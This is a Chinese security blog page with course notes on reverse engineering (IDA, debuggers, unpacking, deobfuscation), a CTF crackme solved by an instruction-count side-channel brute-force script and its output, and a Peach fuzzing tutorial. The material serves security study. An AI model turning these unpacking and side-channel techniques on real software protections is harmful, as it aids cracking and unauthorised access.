</li>
<li>Rizzo匹配</li>
<li>看程序自带的String<ul>
<li>许多程序自带大量调试信息，从而可以获取符号</li>
</ul>
</li>
<li>Google搜索源码<ul>
<li>CS、iOS都有被泄露过</li>
<li>按获得信息搜索源码<ul>
<li>大量程序中使用Stack Overflow、CSDN等答案</li>
</ul>
</li>
</ul>
</li>
<li>制作Signtature<ul>
<li>IDA提供自动制作Signature的工具</li>
<li>打开IDASDK68文件夹找到flair 58文件夹</li>
</ul>
</li>
</ul>
<h3 id="七、IDA-插件搞定虚表"><a href="#七、IDA-插件搞定虚表" class="headerlink" title="七、IDA 插件搞定虚表"></a>七、IDA 插件搞定虚表</h3><h4 id="1-虚表简介"><a href="#1-虚表简介" class="headerlink" title="1. 虚表简介"></a>1. 虚表简介</h4><p>虚表是业界难题，虚函数的处理会因编译器采取的ABI的不同而不同</p>
<ul>
<li>IDA操作的插件<ul>
<li>HexraysCodeXplorer</li>
<li>hexrays_tool</li>
<li>HexRaysPyTools</li>
</ul>
</li>
</ul>
<h4 id="2-实验样例"><a href="#2-实验样例" class="headerlink" title="2. 实验样例"></a>2. 实验样例</h4><ul>
<li>快捷键： Shift + F</li>
<li>菜单： 右键 -&gt; Deeo Scan Variable</li>
<li>操作<ul>
<li>在构造函数中执行上述操作、等待扫描完毕</li>
<li>按Alt+F8打开Signature Builder，看到有黄色部分，然后选不正确的field点</li>
<li>清楚所有的黄色部分后即可点击Finalize，在新弹出的窗口中修改名称</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/02/XMAN之旅-逆向基础（上）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/02/XMAN之旅-逆向基础（上）/" itemprop="url">XMAN之旅_逆向基础（上）</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-02T12:43:02+08:00">
                2017-08-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/xman/" itemprop="url" rel="index">
                    <span itemprop="name">xman</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>这堂课是由Nu1L著名队员Misty所讲，内容很多，范围很广，是作为逆向的基础入门知识——实际上内容还是有点难度的。</p>
<h3 id="一、-初级工具使用"><a href="#一、-初级工具使用" class="headerlink" title="一、 初级工具使用"></a>一、 初级工具使用</h3><p><br></p>
<h4 id="1-二进制编辑器"><a href="#1-二进制编辑器" class="headerlink" title="1. 二进制编辑器"></a>1. 二进制编辑器</h4><p>Misty作为一位资深的逆向大佬，向我们推荐了两款好用的二进制编辑器：010Editor 和 Editplus</p>
<p>010 Editor是文本/十六进制编辑器，还包括文件解析、计算器、文本比较等功能。其可以通过官方网站提供的脚本(Binary Template)对avi、bmp、png、exe等简单格式的文件进行解析，当然也可以根据需求来自己编写文件解析脚本。</p>
<p>010Editor的文本解析功能，方便了我们分析文件，理清文件内容。</p>
<p>Editplus则是Misty的二次元之心作祟，要支持各种编码，这个确实是不错的选择。</p>
<h4 id="2-可执行文件查看"><a href="#2-可执行文件查看" class="headerlink" title="2. 可执行文件查看"></a>2. 可执行文件查看</h4><p>对于这部分，我的感触就是看书，看《加密与解密(第三版)》-看雪安全论坛</p>
<p>PE: CFF Explorer<br>MachO: MachOView<br>ELF: IDA</p>
<h4 id="3-格式转换工具"><a href="#3-格式转换工具" class="headerlink" title="3. 格式转换工具"></a>3. 格式转换工具</h4><p>推荐使用shellcode helper</p>
<h4 id="4-反汇编器"><a href="#4-反汇编器" class="headerlink" title="4. 反汇编器"></a>4. 反汇编器</h4><p>推荐使用IDA<br>IDA的功能十分强大，而且其超前的意识也让它被大家广泛使用！</p>
<ul>
<li>界面转换<ul>
<li>d: 设置Data（多次使用可以在1字节、2字节、4字节、8字节间转换）</li>
<li>c: 设置Code</li>
<li>x: Cross Reference</li>
<li>Shift+F12：查看所有字符串</li>
</ul>
</li>
<li>反编译器使用<ul>
<li>y：设置类型（变量、函数）、设置Calling Conversion</li>
</ul>
</li>
<li>其他快捷键<ul>
<li>N：对（变量、函数）重命名</li>
</ul>
</li>
</ul>
<h4 id="5-调试器"><a href="#5-调试器" class="headerlink" title="5. 调试器"></a>5. 调试器</h4><ul>
<li><p>命令行调试器有：</p>
<ul>
<li>gdb: 用于linux等多种系统中</li>
<li>windbg：用于windows调试</li>
</ul>
</li>
<li><p>图形界面调试器：</p>
<ul>
<li>OllyDbg：调试win32程序</li>
<li>x64_dbg：调试win32/64程序</li>
<li>IDA内置调试器</li>
</ul>
</li>
</ul>
<h4 id="6-搭建调试环境"><a href="#6-搭建调试环境" class="headerlink" title="6. 搭建调试环境"></a>6. 搭建调试环境</h4><p>在IDA PRO中有dbgsrv文件夹。里面放置了一些远程可执行程序。只需要在远程启用这些程序，就可以在本地远程调试。</p>
<h4 id="6-去除软件保护"><a href="#6-去除软件保护" class="headerlink" title="6. 去除软件保护"></a>6. 去除软件保护</h4><ul>
<li>侦壳<ul>
<li>PEiD、ExeInfo</li>
</ul>
</li>
<li>脱壳<ul>
<li>搜索脱壳机（比较多的有upx、ASPack。对于upx，推荐使用upx shell）</li>
<li>ESP定律快速脱壳<ul>
<li>原理：脱壳前后位置不变</li>
<li>适用环境：只针对压缩壳</li>
<li>范例：<br>首先进入程序，并设置ESP处的硬件断点，如图所示<br><img src="/images/2017-08-02/first.png" alt="first"><br>然后运行至硬件断点处，发现后面有个长跳转，在其位置上设置断点<br><img src="/images/2017-08-02/second.jpg" alt="second"><br>最后运行至长跳转位置处，然后直接步进，进入程序的正式入口，选用插件OllyDump，设置起始地址和入口点修正地址，然后脱壳即可！<br><img src="/images/2017-08-02/third.jpg" alt="third"></li>
</ul>
</li>
</ul>
</li>
<li>去除花指令<ul>
<li>使用OllyDbg脚本</li>
<li>手动总结特征码，然后修改</li>
</ul>
</li>
<li>去除混淆<ul>
<li>.net反混淆器 de4dot</li>
</ul>
</li>
</ul>
<h4 id="7-定位验证代码"><a href="#7-定位验证代码" class="headerlink" title="7. 定位验证代码"></a>7. 定位验证代码</h4><ul>
<li><p>任务：</p>
<ul>
<li>破除保护外壳</li>
<li>理解程序逻辑</li>
<li>找到验证函数</li>
<li>逆推获取flag</li>
</ul>
</li>
<li><p>方法</p>
<ul>
<li>正向（从main开始）</li>
<li>逆向（从输入输出函数回溯）</li>
</ul>
</li>
</ul>
<h3 id="二、-逆向方法总结"><a href="#二、-逆向方法总结" class="headerlink" title="二、 逆向方法总结"></a>二、 逆向方法总结</h3><h4 id="1-算法分析与逆向"><a href="#1-算法分析与逆向" class="headerlink" title="1. 算法分析与逆向"></a>1. 算法分析与逆向</h4><ul>
<li>没算法（签到题）</li>
<li>常见算法<ul>
<li>简单异或</li>
<li>带雪崩效应的异或（CBC）</li>
<li>加密算法（RSA、AES）<ul>
<li>RSA中会引用大数库函数</li>
<li>AES如果出得简单，那么解密函数应该在程序中，否则就得理清程序逻辑</li>
</ul>
</li>
<li>散列算法（MD5、SHA1）<ul>
<li>MD5中会出现常数，所以应该会有0123456789ABCDEF这一串数</li>
<li>SHA1中也会出现常数，google一下就能判断</li>
</ul>
</li>
<li>解方程<ul>
<li>推荐使用z3，使用时注意与python配合，十分简单</li>
<li>python的数学运算库</li>
</ul>
</li>
</ul>
</li>
<li>有趣的算法<ul>
<li>走迷宫</li>
</ul>
</li>
</ul>
<h4 id="2-边信道攻击-side-channel-attack-简称SCA"><a href="#2-边信道攻击-side-channel-attack-简称SCA" class="headerlink" title="2. 边信道攻击(side channel attack 简称SCA)"></a>2. 边信道攻击(side channel attack 简称SCA)</h4><p>原理： 检测程序执行的行指令数、<br>应用：逐字节验证的题目</p>
<p><b>范例：采用codegate-preliminary-2014/dodocrackme/</b></p>
<pre><code>$ file crackme 
crackme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=92ef00b31d91a827a5aed6b0fe03fe38fe20fb4d, stripped
$ ./crackme 
root@localhost's password: bla
Permission denied (password).
$ objdump -d crackme | wc -l
15809
</code></pre>

<p>我们使用pin进行测试得到：</p>
<pre><code>$ pin -t inscount0 -o out -- ./crackme ; cat out
root@localhost's password: a
Permission denied (password).
Count 715821
$ pin -t inscount0 -o out -- ./crackme ; cat out
root@localhost's password: b
Permission denied (password).
Count 716328
$ pin -t inscount0 -o out -- ./crackme ; cat out
root@localhost's password: c
Permission denied (password).
Count 716835
$ bc -lq
716328 -715821
507
716835 - 716328
507
</code></pre>

<p>使用所有可见字符，最后得到的测试结果如下：</p>
<pre><code>$ python bf.py 
Input [!] -> [717933] delta [507]
Input ["] -> [718440] delta [507]
Input [#] -> [718947] delta [507]
Input [$] -> [719454] delta [507]
Input [%] -> [719961] delta [507]
Input [&] -> [720468] delta [507]
Input ['] -> [720975] delta [507]
Input [(] -> [721482] delta [507]
Input [)] -> [721989] delta [507]
Input [*] -> [722496] delta [507]
Input [+] -> [723003] delta [507]
Input [,] -> [723510] delta [507]
Input [-] -> [724017] delta [507]
Input [.] -> [724524] delta [507]
Input [/] -> [725031] delta [507]
Input [0] -> [725538] delta [507]
Input [1] -> [726045] delta [507]
Input [2] -> [726552] delta [507]
Input [3] -> [727059] delta [507]
Input [4] -> [727566] delta [507]
Input [5] -> [728073] delta [507]
Input [6] -> [728580] delta [507]
Input [7] -> [729087] delta [507]
Input [8] -> [729594] delta [507]
Input [9] -> [730101] delta [507]
Input [:] -> [730608] delta [507]
Input [;] -> [731115] delta [507]
Input [<] -=""> [731622] delta [507]
Input [=] -> [732129] delta [507]
Input [>] -> [732636] delta [507]
Input [?] -> [733143] delta [507]
Input [@] -> [733650] delta [507]
Input [A] -> [734157] delta [507]
Input [B] -> [734664] delta [507]
Input [C] -> [735171] delta [507]
Input [D] -> [735678] delta [507]
Input [E] -> [736185] delta [507]
Input [F] -> [736692] delta [507]
Input [G] -> [737199] delta [507]
Input [H] -> [701989] delta [-35210]
Input [I] -> [703653] delta [1664]
Input [J] -> [704160] delta [507]
Input [K] -> [704667] delta [507]
Input [L] -> [705174] delta [507]
Input [M] -> [705681] delta [507]
Input [N] -> [706188] delta [507]
Input [O] -> [706695] delta [507]
Input [P] -> [707202] delta [507]
Input [Q] -> [707709] delta [507]
Input [R] -> [708216] delta [507]
Input [S] -> [708723] delta [507]
Input [T] -> [709230] delta [507]
Input [U] -> [709737] delta [507]
Input [V] -> [710244] delta [507]
Input [W] -> [710751] delta [507]
Input [X] -> [711258] delta [507]
Input [Y] -> [711765] delta [507]
Input [Z] -> [712272] delta [507]
Input [[] -> [712779] delta [507]
Input [\] -> [713286] delta [507]
Input []] -> [713793] delta [507]
Input [^] -> [714300] delta [507]
Input [_] -> [714807] delta [507]
Input [`] -> [715314] delta [507]
Input [a] -> [715821] delta [507]
Input [b] -> [716328] delta [507]
Input [c] -> [716835] delta [507]
Input [d] -> [717342] delta [507]
Input [e] -> [717849] delta [507]
Input [f] -> [718356] delta [507]
Input [g] -> [718863] delta [507]
Input [h] -> [719370] delta [507]
Input [i] -> [719877] delta [507]
Input [j] -> [720384] delta [507]
Input [k] -> [720891] delta [507]
Input [l] -> [721398] delta [507]
Input [m] -> [721905] delta [507]
Input [n] -> [722412] delta [507]
Input [o] -> [722919] delta [507]
Input [p] -> [723426] delta [507]
Input [q] -> [723933] delta [507]
Input [r] -> [724440] delta [507]
Input [s] -> [724947] delta [507]
Input [t] -> [725454] delta [507]
Input [u] -> [725961] delta [507]
Input [v] -> [726468] delta [507]
Input [w] -> [726975] delta [507]
Input [x] -> [727482] delta [507]
Input [y] -> [727989] delta [507]
Input [z] -> [728496] delta [507]
Input [{] -> [729003] delta [507]
Input [|] -> [729510] delta [507]
Input [}] -> [730017] delta [507]
Input [~] -> [730524] delta [507]
</]></code></pre>

<p>于是得到首字母为H</p>
<p>我们使用下面的脚本进行测试，得到结果：</p>
<pre><code>#!/usr/bin/python
import os, pexpect, time
from subprocess import Popen,PIPE

pinpath="/ctf/TOOLS/pin/pin"

def try_list(lst):
    procs = {}
    ret_dict = {}
    for (idx, s) in enumerate(lst):
        out_file = s.encode('hex')
        p = Popen([pinpath, "-t", "inscount0", "-o", "tmp/" + out_file, "--", "./crackme"], stdout = PIPE, stdin = PIPE)
        procs[s] = p
        p.stdin.write(s + "\n")

    prev = 0
    show_delta = False
    delta = {}
    for (idx,s) in enumerate(lst):
        while procs[s].poll() is None:
            time.sleep(0.5)
        if "denied" not in procs[s].stdout.read():
            print "Output different for password [%s]" % s
            exit(-1)
        out_file = s.encode('hex')
        output = open("tmp/" + out_file).read().split(" ")[1].strip()
        instr_count = int(output)
        if show_delta:
            #print "Input [%s] -> [%s] delta [%s]" % (s, instr_count, instr_count - prev)
            delta[s] = instr_count - prev
        else:
            show_delta = True
        prev = instr_count

    for (idx,s) in enumerate(lst):
        if idx < 2:
            continue
        if delta[s] != delta[lst[idx-1]]:
            return s

prefix = ""
while True:
    lst = [prefix + chr(i) for i in range(32,127)]
    prefix = try_list(lst)
    print "Trying input -> %s" % prefix

</code></pre>

<h4 id="3-逆向小技巧"><a href="#3-逆向小技巧" class="headerlink" title="3. 逆向小技巧"></a>3. 逆向小技巧</h4><ul>
<li>快速找main入口<ul>
<li>寻找一个<font color="#f00">大跳转</font></li>
</ul>
</li>
<li>快速定位关键位置<ul>
<li>从Function List靠前位置开始乱翻<ul>
<li>编译时不同源文件会被分别编译为.o，再由编译器合并</li>
<li>编译命令行中标准库一般在最前面</li>
</ul>
</li>
<li>从main函数旁边翻</li>
</ul>
</li>
<li>应对MFC程序<ul>
<li>使用xspy工具查看消息处理函数<ul>
<li>将xspy上的放大镜拖到感兴趣的函数（如OnClick、OnCommand等</li>
</ul>
</li>
</ul>
</li>
<li>手动加载Signature<ul>
<li>碰到无法自动识别库函数时<ul>
<li>Shift+F5: View -&gt; Open Subviews -&gt; Signatures (注意要选择好Library，如果使用mfc，就应该选择vc32mfc文件)</li>
<li>Shift+F11: View -&gt; Open Subviews -&gt; Type Libraries</li>
</ul>
</li>
</ul>
</li>
<li>如何得知MessageBox弹框后，程序在哪继续进行<ul>
<li>在OD或x64dbg中找到内存布局列表<ul>
<li>OD：<font color="#f00">Alt+M</font> -&gt; 内存</li>
<li>x64dbg：在窗口栏点击<font color="#f00">内存布局</font></li>
</ul>
</li>
<li>找到自己程序的代码段（通常是本程序的.text，按F2，<font color="#f00">设置区断点</font>）</li>
<li>返回程序点击确定即可</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/28/文件类型漏洞挖掘与Smart-Fuzz/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/07/28/文件类型漏洞挖掘与Smart-Fuzz/" itemprop="url">文件类型漏洞挖掘与Smart Fuzz</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-28T22:25:03+08:00">
                2017-07-28
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全技术/" itemprop="url" rel="index">
                    <span itemprop="name">安全技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="1-Smart-Fuzz"><a href="#1-Smart-Fuzz" class="headerlink" title="1. Smart Fuzz"></a>1. Smart Fuzz</h3><h4 id="1-1-文件格式Fuzz的基本方法"><a href="#1-1-文件格式Fuzz的基本方法" class="headerlink" title="1.1 文件格式Fuzz的基本方法"></a>1.1 文件格式Fuzz的基本方法</h4><p>不管IE还是Office，都有一个共同点，就是用文件作为程序的主要输入。从本质上讲，这些软件都是按照事先约定好的数据结构对文件中不同的数据域进行解析，以决定用什么颜色、在什么位置显示这些数据。</p>
<p>文件格式Fuzz（File Fuzz）就是利用“畸形文件”测试软件鲁棒性的方法。</p>
<p>File Fuzz工具的工作流程大体如下：</p>
<ol>
<li>以正常的文件模板为基础，按照一定规则生成一批畸形文件</li>
<li>将畸形文件逐一送入软件进行解析，并监视软件是否会抛出异常</li>
<li>记录软件产生的错误星系，如寄存器状态、栈状态等</li>
<li>用日志或其他UI形式向测试人员展示异常信息，以进一步鉴定这些错误是否能被利用</li>
</ol>
<p><img src="/images/2017-07-28/file_fuzz.jpg" alt="File Fuzz的一般步骤"></p>
<h4 id="1-2-Blind-Fuzz和Smart-Fuzz"><a href="#1-2-Blind-Fuzz和Smart-Fuzz" class="headerlink" title="1.2 Blind Fuzz和Smart Fuzz"></a>1.2 Blind Fuzz和Smart Fuzz</h4><p>Blind Fuzz就是“盲测”，也即在随机位置插入随机的数据以生成畸形文件。现代软件往往使用非常复杂的数据结构，而数据结构越复杂，解析逻辑越复杂，就越容易出现漏洞。复杂的数据结构有以下特征：</p>
<ol>
<li>拥有一批预定义的静态数据，如magic、cmd id等</li>
<li>数据结构的内容是可以动态改变的</li>
<li>数据结构之间是嵌套的 </li>
<li>数据中存在多种数据关系（size of, point to, reference of, CRC）</li>
<li>有意义的数据被编码或压缩，甚至用另一种文件形式来存储。</li>
</ol>
<p>对于复杂数据结构的复杂文件进行漏洞挖掘，若用Blind Fuzz，则产生测试用例的策略缺少针对性，生成大量无效测试用例，难以发现复杂解析器深层逻辑的漏洞等。</p>
<p>Smart Fuzz的特征：</p>
<ol>
<li>面向逻辑（Logic Oriented Fuzzing）：目标是解析文件的程序逻辑。即明确测试“深度”以及畸形数据的测试“粒度”。</li>
<li>面向数据类型测试（Data Type Oriented Fuzzing）<ul>
<li>算术型，以HEX、ASCII、Unicode、Raw格式存在的各种数值</li>
<li>指针型，Null指针、合法/非法的内存指针等</li>
<li>字符串型，超长字符串、缺少终止符(0x00)的字符串等</li>
<li>特殊字符，#,@,*,&lt;,&gt;,/,\,../等</li>
</ul>
</li>
<li>基于样本（Sample Based Fuzzing）：首先构造合法的样本文件（模板文件），然后以这个文件为模板，每次只改动小部分数据和逻辑来生成畸形文件，这也叫做变异（Mutation）</li>
</ol>
<h3 id="2-用Peach挖掘文件漏洞"><a href="#2-用Peach挖掘文件漏洞" class="headerlink" title="2. 用Peach挖掘文件漏洞"></a>2. 用Peach挖掘文件漏洞</h3><h4 id="2-1-Peach-介绍与安装"><a href="#2-1-Peach-介绍与安装" class="headerlink" title="2.1 Peach 介绍与安装"></a>2.1 Peach 介绍与安装</h4><p>Peach是一款用Python写的开源Smart Fuzz工具，其支持两种文件Fuzz方法：基于生长(Generation Based)和基于变异(Mutation Based)。基于生长的Fuzz方法产生随机或启发性数据来填充给定的数据模型，从而生成畸形文件。基于变异的Fuzz方法在一个给定的样本文件基础上进行修改从而产生畸形文件。</p>
<h4 id="2-2-XML介绍"><a href="#2-2-XML介绍" class="headerlink" title="2.2 XML介绍"></a>2.2 XML介绍</h4><p>XML即&quot;Extensible Generalized Markup Language&quot;，可扩展标记性语言；其与HTML一样都是标准通用标记性语言（Standard Generalized Markup Language, SGML）</p>
<p>XML分为文件序言(Prolog)和文件主体两大部分。文件序言为XML第一行，告诉解析器该如何工作（例如：&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;）。其中version是XML文件所用的标准版本号，必须要有：encoding标明此XML文件的编码类型，如果是Unicode编码时则可以省略。文件主体分为以下几个部分：</p>
<ol>
<li>元素(Element)：&lt;title&gt; lang=&quot;cn&quot;&gt;XML&lt;/title&gt;</li>
<li>标签(Tag)：&lt;tile&gt;</li>
<li>属性(Attribute)：lang就是&lt;title&gt;的属性</li>
<li>根元素(Root Element)：又称文档元素。起始标签</li>
<li>注释(Comment)：&lt;!-- --!&gt;来注释</li>
</ol>
<h4 id="2-3-定义简单的Peach-Pit"><a href="#2-3-定义简单的Peach-Pit" class="headerlink" title="2.3 定义简单的Peach Pit"></a>2.3 定义简单的Peach Pit</h4><p>Peach Pit文件包括以下5个模块：</p>
<ol>
<li>GeneralConf</li>
<li>DataModel</li>
<li>StateModel</li>
<li>Agents and Monitors</li>
<li>Test and Run Configuration</li>
</ol>
<p>所有元素都包含在根元素&lt;Peach&gt;里</p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8" ?&gt;
&lt;Peach xmlns="http://phed.org/2008/Peach" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://phed.org/2008/Peach ../peach.xsd" version="1.0"&gt;
</code></pre>

<p>上面的Peach元素的各个属性基本上是固定的，不要轻易改动</p>
<p>一、 GeneralConf<br>GeneralConf是Peach Pit文件的第一部分，用来定义基本配置信息。包括:</p>
<pre><code>* include: 要包含的其他Peach Pit文件
* Import：要导入的Python库
* PythonPath：要添加的python库路径
</code></pre><p>在HelloWorld中，GeneralConf部分只需写入:</p>
<pre><code>&lt;!-- Import defaults for Peach instance --&gt;
&lt;Include ns="default" src="file:defaults.xml" /&gt;
</code></pre>

<p>二、 DataModel<br>DataModel用来定义数据模型，包括数据结构和数据关系等。一个Peach Pit文件中需要包含一个或多个数据类型。常见的有:</p>
<pre><code>* String：属性有name, size, value, isStatic
* Number：属性有name, size
* Blob: 无具体数据类型，属性有name
* Block： 用于对数据进行分组，属性有name
</code></pre><p>HelloWorld程序中定义的:</p>
<pre><code>&lt;!-- Create a simple data template containing a single string --&gt;
&lt;DataModel name="HelloWorldTemplate"&gt;
        &lt;String value="Hello World!" /&gt;
&lt;/DataModel&gt;
</code></pre>

<p>三、StateModel<br>StateModel用于描述如何向目标程序发送/接收数据。StateModel由至少一个State组成，并且用initialState指定一个State；每个State由至少一个Action组成，Action用于定义StateModel中的各种动作，动作类型由type来指定。Action支持的动作类型包括start、stop、open、close、input、output、call等。</p>
<p>当代码中有多个Action时，则从上往下依次执行。</p>
<pre><code>&lt;StateModel name="State" initialState="State1" &gt;
        &lt;State name="State1"&gt;
                &lt;Action type="output" &gt;
                        &lt;DataModel ref="HelloWorldTemplate"/&gt;
                &lt;/Action&gt;
        &lt;/State&gt;
&lt;/StateModel&gt;
</code></pre>

<p>四、Agent<br>Agent用于定义代理和监视器，可以用来调用Windbg等调试器来检测程序运行的错误信息等，一个Peach Pit文件可以定义多个Agent，每个Agent下可以定义多个Monitor。<br>Monitor类型为debugger.WindowsDebugEngine，是调用Windbg来执行下面的&quot;notepad.exe filename&quot;命令；而若类型为process.PageHeap，则是为notepad.exe开启页堆调试(Page Heap Debug)。</p>
<p>五、Test and Run configuration<br>Test元素用来定义一个测试的配置，包括一个StateModel和一个Publisher，以及including/execluding、Agent信息等。其中StateModel和Publisher是必须定义的，其他可选。Publisher用来定义Peach的IO连接，可以构造网络数据流(如TCP，UDP，HTTP)和文件流(如FileWriter，FileReader)等</p>
<p>在HelloWorld程序中，需要的是将畸形数据显示到命令行，所以Publisher用的是标准输出stdout.Stdout</p>
<pre><code>&lt;Test name="HelloWorldTest"&gt;
        &lt;StateModel ref="State"/&gt;
        &lt;!-- Display test cases to the console --&gt;
        &lt;Publisher class="stdout.Stdout" /&gt;
&lt;/Test&gt;
</code></pre>


<p>Run元素用来定义要运行哪些测试，包括一个或多个Test，另外还可以通过Logger元素配置日志来捕获运行结果。当然，Logger是可选的</p>
<p>HelloWorld程序中，run配置如下：</p>
<pre><code>&lt;!-- Configure a single run --&gt;
&lt;Run name="DefaultRun" description="Stdout HelloWorld Run"&gt;

        &lt;Test ref="HelloWorldTest" /&gt;

&lt;/Run&gt;
</code></pre>


<h4 id="2-4-定义数据之间的依存关系"><a href="#2-4-定义数据之间的依存关系" class="headerlink" title="2.4 定义数据之间的依存关系"></a>2.4 定义数据之间的依存关系</h4><p>在Peach Pit中可以用Relation元素来表示数据长度、数据个数以及数据偏移等信息。格式如下:</p>
<pre><code>&lt;Relation type="size" of="Data" /&gt;
&lt;Relation type="count" of="Data" /&gt;
&lt;Relation type="offset" of="Data" /&gt;
</code></pre>

<p>同样，数据校验值也可以通过Fixup来表示。Fixup支持的校验类型包括CRC32、MD5、SHA1、SHA256、EthernetChecksum、SspiAuthentication等，这可参考官方文档。Fixup格式如下:</p>
<pre><code>&lt;Fixup class="FixupClass"&gt;
    &lt;Param name="ref" value="Data" /&gt;
&lt;/Fixup&gt;
</code></pre>

<p>FixupClass可以为checksum.Crc32Fixup、checksum.SHA256Fixup等。</p>
<p>Crc32Fixup数据模型示例:</p>
<table>
<thead>
<tr>
<th>Offset</th>
<th>Size</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x00</td>
<td>4 bytes</td>
<td>Length of Data</td>
</tr>
<tr>
<td>0x04</td>
<td>4 bytes</td>
<td>Type</td>
</tr>
<tr>
<td>0x08</td>
<td>Data</td>
</tr>
<tr>
<td>after data</td>
<td>4 bytes</td>
<td>CRC of Type and Data</td>
</tr>
</tbody>
</table>
<p>上面数据模型的实现:</p>
<pre><code>&lt;DataModel name="HelloData"&gt;
&lt;Number name="Length" size="32"&gt;
    &lt;Relation type="size" of="Data"/&gt;
&lt;/Number&gt;
&lt;Block name="TypeAndData"&gt;
    &lt;String name="Type" size="32" /&gt;
    &lt;Blob name="Data"/&gt;
&lt;/Block&gt;
&lt;Number name="CRC" size="32"&gt;
    &lt;Fixup class="checksums.Crc32Fixup"&gt;
        &lt;Param name="ref" value="TypeAndData" /&gt;
    &lt;/Fixup&gt;
&lt;/Number&gt;
&lt;/DataModel&gt;
</code></pre>

<h4 id="2-5-用Peach-Fuzz-PNG文件"><a href="#2-5-用Peach-Fuzz-PNG文件" class="headerlink" title="2.5 用Peach Fuzz PNG文件"></a>2.5 用Peach Fuzz PNG文件</h4><p>首先看看png图片的格式，如图所示:<br><img src="/images/2017-07-28/png.jpg" alt="png文件格式"></p>
<p>png最前面是8字节PNG签名，十六进制为89 50 4E 0D 0A 1A 0A。随后是若干个数据区块(Chunk)，包括IDHR、IDAT、IEND等。</p>
<p>png文件Chunk格式</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Size</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Length</td>
<td>4 bytes</td>
<td>Length of data field</td>
</tr>
<tr>
<td>Type</td>
<td>4 bytes</td>
<td>Chunk type code</td>
</tr>
<tr>
<td>Data</td>
<td></td>
<td>Data Bytes</td>
</tr>
<tr>
<td>CRC</td>
<td>4 bytes</td>
<td>CRC of type and data</td>
</tr>
</tbody>
</table>
<p>可以将Chunk的DataModel定义如下:</p>
<pre><code>&lt;DataModel name="Chunk"&gt;
&lt;Number name="Length" size="32" signed="false"&gt;
    &lt;Relation type="size" of="Data"/&gt;
&lt;/Number&gt;
&lt;Block name="TypeAndData"&gt;
    &lt;String name="Type" size="4" /&gt;
    &lt;Blob name="Data" /&gt;
&lt;/Block&gt;
&lt;Number name="CRC" size="32"&gt;
    &lt;Fixup class="checksums.Crc32Fixup"&gt;
        &lt;Param name="ref" value="TypeAndData" /&gt;
    &lt;/Fixup&gt;
&lt;/Number&gt;
&lt;/DataModel&gt;
</code></pre>

<p>PNG简单地认为是由一个PNG签名和若干个结构相同的Chunk组成。在Chunk数据模型之后将PNG文件的DataModel进行如下定义：</p>
<pre><code>&lt;DataModel name="Png"&gt;
&lt;Blob name="pngMagic" isStatic="true" valueTyp="hex" value="89 50 4E 47 0D 0A 1A 0A" /&gt;
&lt;Block ref="Chunk" minOccurs="1" maxOccurs="1024" /&gt;
&lt;/DataModel&gt;
</code></pre>

<p>minOccurs=&quot;1&quot; maxOccurs=&quot;1024&quot;表示该区块最少重复1次，最多重复1024次</p>
<p>然后配置StateModel:第一步修改文件生成畸形文件；第二部需要把文件关闭；第三步需要调用适当的程序打开生成的畸形文件（这里使用pngcheck）。</p>
